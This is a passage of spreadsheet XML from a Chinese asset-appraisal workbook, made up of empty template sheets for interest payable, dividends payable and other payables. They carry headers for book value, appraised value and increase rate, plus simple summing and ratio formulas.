    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="B5" sqref="B5"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="22" customWidth="1" style="410" min="3" max="3"/>
    <col width="11" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.3333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="19.5" customWidth="1" style="410" min="6" max="6"/>
    <col width="11.8333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="10"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col width="9.66666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col width="9" customWidth="1" style="410" min="13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其他应付款—应付利息评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'5-10其他应付款汇总表'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="18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402" t="inlineStr">
        <is>
          <t>表5-10-1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="571">
        <f>'5-10其他应付款汇总表'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="554" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18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本金</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>利息所属期间</t>
        </is>
      </c>
      <c r="G5" s="380" t="inlineStr">
        <is>
          <t>年利息率%</t>
        </is>
      </c>
      <c r="H5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="I5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="380" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555">
        <f>I6-H6</f>
        <v/>
      </c>
      <c r="K6" s="555">
        <f>IF(H6=0,"",J6/H6*100)</f>
        <v/>
      </c>
      <c r="L6" s="383" t="n"/>
    </row>
    <row r="7" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555">
        <f>I7-H7</f>
        <v/>
      </c>
      <c r="K7" s="555">
        <f>IF(H7=0,"",J7/H7*100)</f>
        <v/>
      </c>
      <c r="L7" s="383" t="n"/>
    </row>
    <row r="8" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555">
        <f>I8-H8</f>
        <v/>
      </c>
      <c r="K8" s="555">
        <f>IF(H8=0,"",J8/H8*100)</f>
        <v/>
      </c>
      <c r="L8" s="383" t="n"/>
    </row>
    <row r="9" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="555" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555">
        <f>I9-H9</f>
        <v/>
      </c>
      <c r="K9" s="555">
        <f>IF(H9=0,"",J9/H9*100)</f>
        <v/>
      </c>
      <c r="L9" s="383" t="n"/>
    </row>
    <row r="10" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="555" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555">
        <f>I10-H10</f>
        <v/>
      </c>
      <c r="K10" s="555">
        <f>IF(H10=0,"",J10/H10*100)</f>
        <v/>
      </c>
      <c r="L10" s="383" t="n"/>
    </row>
    <row r="11" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="555" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555">
        <f>I11-H11</f>
        <v/>
      </c>
      <c r="K11" s="555">
        <f>IF(H11=0,"",J11/H11*100)</f>
        <v/>
      </c>
      <c r="L11" s="383" t="n"/>
    </row>
    <row r="12" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="555" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555">
        <f>I12-H12</f>
        <v/>
      </c>
      <c r="K12" s="555">
        <f>IF(H12=0,"",J12/H12*100)</f>
        <v/>
      </c>
      <c r="L12" s="383" t="n"/>
    </row>
    <row r="13" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="555" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555">
        <f>I13-H13</f>
        <v/>
      </c>
      <c r="K13" s="555">
        <f>IF(H13=0,"",J13/H13*100)</f>
        <v/>
      </c>
      <c r="L13" s="383" t="n"/>
    </row>
    <row r="14" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="555" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555">
        <f>I14-H14</f>
        <v/>
      </c>
      <c r="K14" s="555">
        <f>IF(H14=0,"",J14/H14*100)</f>
        <v/>
      </c>
      <c r="L14" s="383" t="n"/>
    </row>
    <row r="15" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555">
        <f>I15-H15</f>
        <v/>
      </c>
      <c r="K15" s="555">
        <f>IF(H15=0,"",J15/H15*100)</f>
        <v/>
      </c>
      <c r="L15" s="383" t="n"/>
    </row>
    <row r="16" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555">
        <f>I16-H16</f>
        <v/>
      </c>
      <c r="K16" s="555">
        <f>IF(H16=0,"",J16/H16*100)</f>
        <v/>
      </c>
      <c r="L16" s="383" t="n"/>
    </row>
    <row r="17" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555">
        <f>I17-H17</f>
        <v/>
      </c>
      <c r="K17" s="555">
        <f>IF(H17=0,"",J17/H17*100)</f>
        <v/>
      </c>
      <c r="L17" s="383" t="n"/>
    </row>
    <row r="18" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555">
        <f>I18-H18</f>
        <v/>
      </c>
      <c r="K18" s="555">
        <f>IF(H18=0,"",J18/H18*100)</f>
        <v/>
      </c>
      <c r="L18" s="383" t="n"/>
    </row>
    <row r="19" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="555" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555">
        <f>I19-H19</f>
        <v/>
      </c>
      <c r="K19" s="555">
        <f>IF(H19=0,"",J19/H19*100)</f>
        <v/>
      </c>
      <c r="L19" s="383" t="n"/>
    </row>
    <row r="20" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="555" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555">
        <f>I20-H20</f>
        <v/>
      </c>
      <c r="K20" s="555">
        <f>IF(H20=0,"",J20/H20*100)</f>
        <v/>
      </c>
      <c r="L20" s="383" t="n"/>
    </row>
    <row r="21" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="555" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555">
        <f>I21-H21</f>
        <v/>
      </c>
      <c r="K21" s="555">
        <f>IF(H21=0,"",J21/H21*100)</f>
        <v/>
      </c>
      <c r="L21" s="383" t="n"/>
    </row>
    <row r="22" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="555" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555">
        <f>I22-H22</f>
        <v/>
      </c>
      <c r="K22" s="555">
        <f>IF(H22=0,"",J22/H22*100)</f>
        <v/>
      </c>
      <c r="L22" s="383" t="n"/>
    </row>
    <row r="23" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="555" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555">
        <f>I23-H23</f>
        <v/>
      </c>
      <c r="K23" s="555">
        <f>IF(H23=0,"",J23/H23*100)</f>
        <v/>
      </c>
      <c r="L23" s="383" t="n"/>
    </row>
    <row r="24" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="555" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555">
        <f>I24-H24</f>
        <v/>
      </c>
      <c r="K24" s="555">
        <f>IF(H24=0,"",J24/H24*100)</f>
        <v/>
      </c>
      <c r="L24" s="383" t="n"/>
    </row>
    <row r="25" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555">
        <f>I25-H25</f>
        <v/>
      </c>
      <c r="K25" s="555">
        <f>IF(H25=0,"",J25/H25*100)</f>
        <v/>
      </c>
      <c r="L25" s="383" t="n"/>
    </row>
    <row r="26" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="555" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="555" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555">
        <f>I26-H26</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>IF(H26=0,"",J26/H26*100)</f>
        <v/>
      </c>
      <c r="L26" s="383" t="n"/>
    </row>
    <row r="27" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="383" t="n"/>
      <c r="E27" s="555">
        <f>ROUND(SUM(E6:E26),2)</f>
        <v/>
      </c>
      <c r="F27" s="383" t="n"/>
      <c r="G27" s="383" t="n"/>
      <c r="H27" s="555">
        <f>ROUND(SUM(H6:H26),2)</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>ROUND(SUM(I6:I26),2)</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>I27-H27</f>
        <v/>
      </c>
      <c r="K27" s="555">
        <f>IF(H27=0,"",J27/H27*100)</f>
        <v/>
      </c>
      <c r="L27" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B2:L2"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B1:L1"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:L27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0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 codeName="Sheet91">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="O15" sqref="O15"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="14.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="33" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="18.1666666666667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其他应付款—应付股利（应付利润）评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'5-10其他应付款汇总表'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="18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402" t="inlineStr">
        <is>
          <t>表5-10-2</t>
        </is>
      </c>
    </row>
    <row r="4" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A4" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B4" s="571">
        <f>'5-10其他应付款汇总表'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="554" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="376" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18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投资单位名称（股东）</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>利润所属期间</t>
        </is>
      </c>
      <c r="F5" s="307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8" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="3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8" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="578" t="n"/>
      <c r="E19" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="578" t="n"/>
      <c r="E20" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="578" t="n"/>
      <c r="E21" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="578" t="n"/>
      <c r="E22" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="578" t="n"/>
      <c r="E23" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="578" t="n"/>
      <c r="E24" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="578" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="115" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="555">
        <f>ROUND(SUM(F6:F26),2)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>ROUND(SUM(G6:G26),2)</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J27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5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 codeName="Sheet92">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.8333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="28.5" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="13.1666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col hidden="1" outlineLevel="1" width="7.16666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col hidden="1" outlineLevel="1" width="11.8333333333333" customWidth="1" style="410" min="7" max="7"/>
    <col hidden="1" outlineLevel="1" width="13.1666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col collapsed="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col width="16.6666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="9" customWidth="1" style="410" min="14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其他应付款—其他应付款评估明细表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7" t="n"/>
      <c r="L3" s="547" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表5-10-3</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="41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63" t="n"/>
      <c r="G4" s="563" t="n"/>
      <c r="H4" s="563" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5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业务内容</t>
        </is>
      </c>
      <c r="F5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="I5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="185" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="588" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-I6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(I6=0,"",K6/I6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="588" t="n"/>
      <c r="I7" s="555" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-I7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(I7=0,"",K7/I7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
